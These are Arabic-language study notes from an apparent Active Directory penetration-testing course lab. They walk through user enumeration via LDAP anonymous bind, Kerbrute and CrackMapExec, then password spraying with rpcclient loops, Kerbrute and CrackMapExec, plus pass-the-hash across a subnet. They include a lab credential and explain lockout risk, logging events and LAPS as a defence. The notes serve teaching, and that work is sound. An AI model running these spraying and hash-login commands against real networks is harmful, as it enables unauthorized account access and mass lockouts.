لأن الـ Password Policy بتقول مثلاً:

```
Reset Counter After

30 Minutes
```

يبقى تعرف العداد لسه موجود.

ولا رجع صفر.

---

## نقطة مهمة جدًا

لو فيه أكتر من Domain Controller.

كل واحد بيحتفظ بـ

```
badpwdcount
```

بشكل منفصل.

---

وده معناه.

إنك لو سألت DC واحد.

مش شرط يكون عنده العدد الحقيقي.

---

## الحل

إما:

تسأل كل Domain Controller.

---

أو

تسأل الـ

```
PDC Emulator
```

لأنه المرجع الأساسي للحسابات داخل الدومين.

---

## ملخص الجزء

بعد الجزء ده بقينا نعرف:

- إزاي نبني Target User List.
- ليه Password Policy لازم تتعرف الأول.
- ليه لازم نوثق كل محاولة.
- إزاي نجيب Users باستخدام enum4linux.
- إزاي نجيب Users باستخدام rpcclient.
- إزاي CrackMapExec بيعرض Users بالإضافة إلى badpwdcount و baddpwdtime، وازاي المعلومات دي بتساعدنا نتجنب Lockout قبل تنفيذ Password Spraying.

## Gathering Users with LDAP Anonymous

بعد ما عرفنا إزاي نجيب Users باستخدام SMB NULL Session.

في طريقة تانية اسمها:

**LDAP Anonymous Bind**

ودي بتعتمد على إن السيرفر يسمح لأي شخص يعمل Query على الـ LDAP بدون Username أو Password.

---

## يعني إيه LDAP؟

LDAP اختصار:

**Lightweight Directory Access Protocol**

وده البروتوكول اللي Active Directory بيستخدمه علشان يخزن ويسترجع معلومات عن:

- Users
- Groups
- Computers
- Organizational Units (OU)
- Password Policies

بمعنى إن أي عملية بحث داخل الـ Active Directory غالبًا بتتم باستخدام LDAP.

---

## يعني إيه Anonymous Bind؟

كلمة Bind في LDAP معناها:

"تعمل Login أو Connection مع السيرفر."

لكن هنا Anonymous Bind يعني:

تعمل اتصال **بدون Authentication**.

يعني:

- Username = فارغ
- Password = فارغ

لو السيرفر سمح بده، تقدر تقرأ بيانات كتير من الـ Active Directory.

---

## الأدوات المستخدمة

الدرس ذكر أداتين:

- ldapsearch
- windapsearch

---

## ldapsearch

الأمر:

```bash
ldapsearch \
-h 172.16.5.5 \
-x \
-b "DC=INLANEFREIGHT,DC=LOCAL" \
-s sub \
"(&(objectclass=user))"
```

---

## نشرح الأمر بالكامل

### ldapsearch

أداة موجودة غالبًا في Linux.

بتستخدم لإرسال استعلامات (Queries) إلى LDAP Server.

---

### -h

```bash
-h 172.16.5.5
```

يعني:

عنوان الـ Domain Controller.

---

### -x

يعني:

استخدم Simple Authentication.

وفي الحالة دي بما إننا مش مديين Username أو Password.

يبقى هيحاول يعمل Anonymous Bind.

---

### -b

```bash
-b "DC=INLANEFREIGHT,DC=LOCAL"
```

دي اسمها:

**Base DN**

---

## يعني إيه Base DN؟

هي النقطة اللي هيبدأ منها البحث.

لو الدومين:

```
INLANEFREIGHT.LOCAL
```

يبقى الـ Base DN بيكون:

```
DC=INLANEFREIGHT,DC=LOCAL
```

---

### -s sub

اختصار:

Subtree.

يعني:

ابحث في كل الفروع.

مش في الـ Root بس.

---

### "(&(objectclass=user))"

ده اسمه:

LDAP Search Filter.

---

## يعني إيه Search Filter؟

هو الشرط اللي بقوله للسيرفر.

هنا الشرط هو:

```
هات أي Object
نوعه User
```

يعني متجبليش:

- Groups
- Computers
- Printers

هات المستخدمين فقط.

---

## بعد كده

الأمر بيستخدم

```bash
grep
```

---

```bash
grep sAMAccountName:
```

---

## sAMAccountName

ده أهم Attribute خاص باليوزر.

وهو الـ Username.

مثلاً:

```
Administrator

Ahmed

Mohab
```

---

بعدها

```bash
cut
```

علشان يطلع اسم المستخدم فقط.

---

## الناتج

```text
guest

ACADEMY-EA-DC01$

ACADEMY-EA-MS01$

ACADEMY-EA-WEB01$

htb-student

avazquez
```

---

## ليه فيه أسماء بتنتهي بـ $

زي:

```
ACADEMY-EA-DC01$
```

دي مش Users.

دي Computer Accounts.

---

في Active Directory.

كل جهاز ليه Account.

وبيكون آخره علامة:

```
$
```

زي:

```
PC01$

SERVER01$

WEB01$
```

---

## windapsearch

الدرس قال إن استخدام ldapsearch محتاج تعرف LDAP Filters.

لكن windapsearch أسهل.

---

الأمر

```bash
./windapsearch.py \
--dc-ip 172.16.5.5 \
-u "" \
-U
```

---

## نشرح

### --dc-ip

IP بتاع الـ Domain Controller.

---

### -u ""

Username فارغ.

علشان Anonymous Bind.

---

### -U

يعني:

اعرض المستخدمين فقط.

Users Only.

---

## الناتج

```text
Attempting bind

success!
```

---

وده معناه

إن Anonymous Bind اشتغل.

---

بعدها

```text
Enumerating all AD users
```

يعني:

هيبدأ يجيب كل المستخدمين.

---

مثلاً

```text
cn: Annie Vazquez
```

---

## cn

اختصار:

Common Name.

وده الاسم الكامل.

---

بعدها

```text
userPrincipalName
```

---

## userPrincipalName

ده اسم المستخدم الكامل.

مثلاً

```
avazquez@inlanefreight.local
```

وده غالبًا بيستخدم أثناء تسجيل الدخول.

---

## Enumerating Users with Kerbrute

دلوقتي نفترض إن:

- مفيش NULL Session.
- مفيش LDAP Anonymous.
- معندكش Credentials.

نعمل إيه؟

---

هنا بنستخدم:

Kerbrute.

---

## Kerbrute

أداة بتستخدم بروتوكول:

Kerberos.

علشان تعرف إذا كان Username موجود ولا لأ.

---

## أهم ميزة

إنها أسرع جدًا.

وكمان أقل ضوضاء (Stealthier).

---

## ليه؟

لأنها مش بتحاول تعمل Login بالطريقة التقليدية.

---

هي بتبعت

TGT Request

للـ KDC.

---

## يعني إيه TGT؟

TGT اختصار:

**Ticket Granting Ticket**

وده أول Ticket المستخدم بياخده لما يعمل Login باستخدام Kerberos.

---

## KDC

اختصار:

Key Distribution Center.

وده جزء من الـ Domain Controller مسؤول عن Kerberos Authentication.

---

## Kerberos Pre-Authentication

الدرس ذكر نقطة مهمة جدًا.

Kerbrute بيبعت طلب بدون Pre-Authentication.

---

لو الـ KDC رد:

```
PRINCIPAL UNKNOWN
```

يبقى

الـ Username غير موجود.

---

أما لو قال:

```
هات Kerberos Pre-Authentication
```

يبقى

اليوزر موجود.

---

## ليه الطريقة دي مميزة؟

لأنها:

لا تعتبر Login Failure.

وبالتالي

مش بتطلع Event ID

```
4625
```

---

## Event ID 4625

ده Event بيتسجل لما:

حد يحاول يعمل Login ويفشل.

وده الـ SOC أو الـ SIEM بيراقبه غالبًا.

---

## لكن هل Kerbrute Invisible؟

لا.

---

هو بيطلع Event مختلف.

اسمه

```
4768
```

---

## Event ID 4768

يعني:

تم طلب Ticket من Kerberos.

---

وده بيظهر فقط.

لو الشركة مفعلة:

Kerberos Logging.

---

## الأمر

```bash
kerbrute userenum \
-d inlanefreight.local \
--dc 172.16.5.5 \
/opt/jsmith.txt
```

---

## نشرح

### userenum

يعني:

اعمل Username Enumeration.

---

### -d

اسم الدومين.

---

### --dc

IP بتاع الـ Domain Controller.

---

### /opt/jsmith.txt

Wordlist.

فيها آلاف الـ Usernames المحتملة.

---

## الناتج

```text
VALID USERNAME:

jjones

sbrown

tjohnson
```

---

يعني

كل دول موجودين داخل الـ Active Directory.

---

## سرعة Kerbrute

الدرس ذكر مثال.

فحص:

```
48,705 Username
```

في حوالي:

```
12 ثانية
```

وده سريع جدًا.

---

## هل الطريقة دي بتقفل الحسابات؟

أثناء Username Enumeration

لا.

---

لكن

لو استخدمت Kerbrute بعد كده في Password Spraying.

يبقى أي Password غلط.

هيتحسب ضمن:

```
badpwdcount
```

وممكن يقفل الحساب.

---

## لو معرفتش تجيب Users بأي طريقة؟

الكاتب قال.

ارجع لـ OSINT.

---

زي:

- LinkedIn
- Email Harvesting
- أسماء الموظفين على الموقع الرسمي
- أدوات مثل linkedin2username لتوليد أسماء مستخدمين محتملة بناءً على أسماء الموظفين.

---

## Credentialed Enumeration

لو معاك Username و Password صحيحين.

يبقى الموضوع أسهل بكتير.

---

الأمر:

```bash
crackmapexec smb 172.16.5.5 \
-u htb-student \
-p Academy_student_AD! \
--users
```

---

## الفرق بينه وبين اللي فات

المرة اللي فاتت استخدمنا:

```
--users
```

بدون Credentials.

---

المرة دي

بنستخدم User حقيقي.

---

وده بيدينا معلومات أدق.

زي:

```text
badpwdcount
```

---

و

```text
baddpwdtime
```

لكل User.

---

مثلاً

```text
avazquez

badpwdcount : 20
```

---

وده معناه.

المستخدم غلط 20 مرة.

---

ولو الـ Lockout Threshold

5

يبقى ده حساب لازم تتجنبه تمامًا أثناء الـ Password Spraying، لأن أي محاولة إضافية قد تؤدي إلى قفله إذا كانت العداد لم يتم إعادة تعيينه وفقًا للـ Password Policy.

---

## ملخص الجزء

بعد الجزء ده بقينا نعرف:

- إزاي نستخدم LDAP Anonymous Bind لجمع المستخدمين.
- الفرق بين ldapsearch و windapsearch.
- معنى Base DN و LDAP Search Filter و sAMAccountName.
- ليه Computer Accounts بتنتهي بعلامة `$`.
- إزاي Kerbrute بيكتشف اليوزرز باستخدام Kerberos.
- الفرق بين Event ID 4625 و Event ID 4768.
- إمتى Kerbrute آمن، وإمتى ممكن يسبب Account Lockout.
- إزاي نستخدم CrackMapExec مع Credentials للحصول على قائمة مستخدمين ومعلومات تساعدنا قبل تنفيذ Password Spraying.

# Layer 11
## Internal Password Spraying - from Linux

بعد ما جمعنا:

- قائمة المستخدمين (User List)
- وعرفنا الـ Password Policy

يبقى جاهزين ننفذ **Password Spraying**.

الدرس هنا بيشرح إزاي تعمل الهجوم من جهاز Linux.

---

## يعني إيه Internal Password Spraying؟

يعني أنت بالفعل موجود داخل شبكة الشركة.

مش بتهاجم من الإنترنت.

يعني مثلاً:

- على جهاز Kali داخل الشركة.
- أو واخد Shell على جهاز Linux.
- أو داخل VPN الخاصة بالشركة.

ومن هناك تبدأ تجرب Password واحد على كل المستخدمين.

---

## ليه لازم نمشي بحذر؟

الكاتب أكد على النقطة دي.

لأن أي Password غلط بيتحسب.

ولو عديت الـ Lockout Threshold.

الحسابات هتتقفل.

وده:

- هيكشف وجودك.
- وهيعمل مشاكل للعميل.
- وهيعتبر تنفيذ سيء للـ Pentest.

---

## Password Spraying باستخدام rpcclient

الكاتب بيقول إن rpcclient يعتبر من أفضل الأدوات لتنفيذ Password Spraying من Linux.

---

## المشكلة في rpcclient

لما الـ Login ينجح.

مش بيقولك:

```
SUCCESS
```

مثلاً.

لا.

بيطلع Output عادي.

فلازم تعرف إيه العلامة اللي تدل إن الـ Login نجح.

---

## علامة نجاح الـ Login

لو ظهر:

```text
Authority Name
```

يبقى Authentication نجح.

---

## الأمر

```bash
for u in $(cat valid_users.txt); do
rpcclient -U "$u%Welcome1" \
-c "getusername;quit" \
172.16.5.5 | grep Authority;
done
```

---

## نشرح الأمر بالكامل

---

### for

```bash
for u
```

دي Loop.

هتلف على كل User.

---

### $(cat valid_users.txt)

يعني:

اقرأ الملف.

مثلاً

```
ahmed

mohab

admin

john
```

---

كل سطر.

هيتحط في المتغير:

```
u
```

---

### rpcclient

الأداة اللي هتعمل Authentication.

---

### -U

```bash
-U "$u%Welcome1"
```

دي أهم جزء.

---

لاحظ الشكل.

```
Username%Password
```

يعني

```
ahmed%Welcome1
```

---

ثم

```
mohab%Welcome1
```

---

ثم

```
admin%Welcome1
```

وهكذا.

---

### -c

```bash
-c
```

يعني:

نفذ Command.

وبعدين اقفل.

---

### getusername

بعد الـ Login.

اسأل السيرفر:

مين اليوزر الحالي؟

---

لو الـ Login نجح.

هيرجع:

اسم المستخدم.

---

### quit

اقفل الاتصال.

---

### grep Authority

فلترة.

يعني:

هات السطور اللي فيها

```
Authority
```

بس.

---

## الناتج

```text
Account Name: tjohnson

Authority Name: INLANEFREIGHT
```

---

وده معناه.

إن Login نجح.

---

لو مفيش Output.

يبقى Password غلط.

---

## ليه grep مهم؟

بدونه.

هتشوف مئات الرسائل.

وممكن تضيع الـ Success وسطها.

---

## Password Spraying باستخدام Kerbrute

الأداة التانية.

هي Kerbrute.

---

## الأمر

```bash
kerbrute passwordspray \
-d inlanefreight.local \
--dc 172.16.5.5 \
valid_users.txt \
Welcome1
```

---

## نشرح

### passwordspray

يعني:

نفذ Password Spraying.

---

### -d

اسم الدومين.

---

### --dc

IP بتاع الـ Domain Controller.

---

### valid_users.txt

ملف المستخدمين.

---

### Welcome1

الباسورد اللي هيتجرب.

---

## الناتج

```text
VALID LOGIN

sgage

Welcome1
```

---

وده معناه.

اليوزر:

```
sgage
```

بيستخدم

```
Welcome1
```

---

بعدها

```text
Done!
```

---

وبيوضح:

- عدد الـ Logins.
- عدد النجاحات.
- الوقت.

---

## CrackMapExec Password Spraying

طريقة تالتة.

---

الأمر

```bash
sudo crackmapexec smb \
172.16.5.5 \
-u valid_users.txt \
-p Password123
```

---

## نشرح

### smb

هنجرب Authentication باستخدام SMB.

---

### -u

بدل User واحد.

اديناله File.

---

كل User.

هيتجرب عليه Password واحدة.

---

### -p

الباسورد.

---

## grep +

بعدها

```bash
grep +
```

---

ليه؟

لأن CrackMapExec بيطلع Output لكل User.

---

لكن.

الـ Success.

بيكون فيه

```
[+]
```

---

فالفلترة دي.

بتطلع النجاحات فقط.

---

## الناتج

```text
[+]

avazquez

Password123
```

---

وده معناه.

اليوزر.

Password بتاعه صحيحة.

---

## التحقق من الـ Credentials

بعد ما تلاقي Password صحيحة.

لا تعتمد على نتيجة الـ Spray فقط.

---

اعمل Validation.

---

الأمر

```bash
crackmapexec smb \
172.16.5.5 \
-u avazquez \
-p Password123
```

---

## الهدف

نتأكد إن:

- Username صحيح.
- Password صحيحة.
- Authentication شغال.

---

لو ظهر

```text
[+]
```

يبقى Credentials صحيحة.

---

## Local Administrator Password Reuse

الدرس بعد كده دخل في نقطة مهمة جدًا.

---

## هل Password Spraying بيكون على Domain Users فقط؟

لا.

---

ممكن كمان.

تجربه على:

Local Administrator.

---

## يعني إيه Local Administrator؟

كل جهاز Windows.

فيه Administrator خاص بيه.

---

وده مختلف عن:

```
Domain Administrator
```

---

## المشكلة الكبيرة

شركات كتير.

بتستخدم نفس Password.

على كل الأجهزة.

---

مثلاً.

كل الأجهزة.

Password بتاع الـ Administrator فيها

```
Admin@123
```

---

لو عرفت Password جهاز واحد.

يبقى غالبًا.

هتدخل باقي الأجهزة.

---

## ليه المشكلة دي موجودة؟

بسبب

Gold Images.

---

## يعني إيه Gold Image؟

هي نسخة Windows جاهزة.

الشركة بتعمل منها Clone.

على كل الأجهزة.

---

لو النسخة فيها:

```
Administrator

Password123
```

---

يبقى كل الأجهزة.

هيكون فيها نفس Password.

---

## CrackMapExec

بيقدر يجرب نفس الـ Password.

على كل الأجهزة.

---

## الأجهزة المهمة

الكاتب قال.

ركز على:

- SQL Servers
- Exchange Servers

---

## ليه؟

لأن غالبًا.

هيكون عليهم:

- Admins.
- Service Accounts.
- Credentials في الذاكرة.

---

## إعادة استخدام Passwords

مثلاً.

لقيت

```
desktop%@admin123
```

على جهاز Desktop.

---

جرب

```
server%@admin123
```

على السيرفرات.

---

لأن الشركات أحيانًا بتغير جزء بسيط فقط من كلمة السر حسب نوع الجهاز.

---

## نفس الفكرة مع المستخدمين

مثلاً.

عرفت Password المستخدم:

```
ajones
```

---

جربها على:

```
ajones_adm
```

---

لأن بعض الشركات بتدي نفس الشخص:

- User Account
- Admin Account

بنفس Password.

---

## Domain Trust

ممكن كمان.

يبقى فيه:

Domain A

و

Domain B

---

ونفس المستخدم.

بيستخدم نفس Password.

في الاتنين.

---

## NTLM Hash

أحيانًا.

مش هتعرف Password.

---

لكن هتعرف:

NTLM Hash.

---

## يعني إيه NTLM Hash؟

هو تمثيل مشفر (Hash) لكلمة المرور، ويُستخدم في بعض بروتوكولات المصادقة داخل Windows. بعض الأدوات تستطيع استخدام الـ Hash مباشرة للمصادقة في سيناريوهات معينة بدون معرفة كلمة المرور الأصلية.

---

## الأمر

```bash
sudo crackmapexec smb \
--local-auth \
172.16.5.0/23 \
-u administrator \
-H 88ad09182de639ccc6579eb0849751cf
```

---

## نشرح

### --local-auth

مهمة جدًا.

---

بتقول لـ CrackMapExec.

متستخدمش Domain Authentication.

---

استخدم Local Accounts فقط.

---

وده بيمنع.

إنه يجرب على الدومين.

وبالتالي يقلل خطر قفل حساب Domain Administrator.

---

### 172.16.5.0/23

Network كاملة.

---

يعني.

جرب على كل الأجهزة.

---

### -u administrator

اليوزر المحلي.

---

### -H

بدل Password.

بنستخدم NTLM Hash.

---

## الناتج

```text
(Pwn3d!)
```

---

## يعني إيه Pwn3d! ؟

دي رسالة من CrackMapExec.

معناها:

تم تسجيل الدخول بنجاح.

والحساب عنده صلاحيات Administrator على الجهاز.

---

## بعد كده نعمل إيه؟

نبدأ نفحص الأجهزة.

يمكن نلاقي:

- Credentials.
- ملفات مهمة.
- Session لـ Domain Admin.
- أو أي وسيلة تساعدنا نوصل للدومين.

---

## هل الطريقة دي Stealth؟

لا.

---

الكاتب قال.

الطريقة دي:

**Noisy جدًا.**

---

يعني هتعمل كمية كبيرة من محاولات الاتصال على أجهزة كثيرة، وده ممكن يكون ملحوظ في الـ Logs وأنظمة المراقبة.

---

## علاج المشكلة

الكاتب اقترح استخدام:

**LAPS (Local Administrator Password Solution).**

---

## يعني إيه LAPS؟

أداة مجانية من Microsoft.

بتخلي:

كل جهاز.

له Password مختلفة للـ Local Administrator.

---

وكمان.

بتغيرها تلقائيًا كل فترة.

---

وبالتالي.

حتى لو عرفت Password جهاز.

مش هتدخل أي جهاز تاني.

---

## ملخص الجزء

بعد الجزء ده بقينا نعرف:

- إزاي ننفذ Password Spraying من Linux باستخدام `rpcclient`.
- ليه `Authority Name` دليل على نجاح تسجيل الدخول.
- إزاي نستخدم `Kerbrute` في Password Spraying.
- إزاي نستخدم `CrackMapExec` لتنفيذ الهجوم والتحقق من الـ Credentials.
- يعني إيه Local Administrator Password Reuse وليه يعتبر خطر.
- الفرق بين استخدام Password عادية واستخدام NTLM Hash.
- أهمية `--local-auth` عند تجربة Local Administrator.
- معنى رسالة `Pwn3d!`.
- ليه إعادة استخدام كلمات مرور الـ Local Administrator مشكلة كبيرة، وإزاي LAPS بيعالجها.

# Layer 12
